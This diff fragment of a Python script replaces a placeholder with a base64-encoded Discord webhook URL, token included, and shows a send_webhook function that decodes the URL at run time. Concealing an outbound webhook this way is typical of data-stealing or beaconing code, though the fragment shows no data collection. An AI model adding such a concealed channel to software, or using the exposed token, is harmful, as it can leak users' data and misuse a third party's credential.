@@ -5,7 +5,7 @@ import socket
 import urllib.request
 
 # Base64-encoded Discord webhook URL
-WEBHOOK_B64 = "PASTE_BASE64_WEBHOOK_HERE"
+WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MTM2NTkwMjUzOTg4NjYxNC96SDZnWkI4YXNzLTY3TTJVQkVXWFcwTGk2a21vOWtPc2NrOUhOZ0pBMk5Ea2JhYW1vbWs0cDQ4bzR1WGdwaUZFdjJwZA=="
 
 def send_webhook(message):
     webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
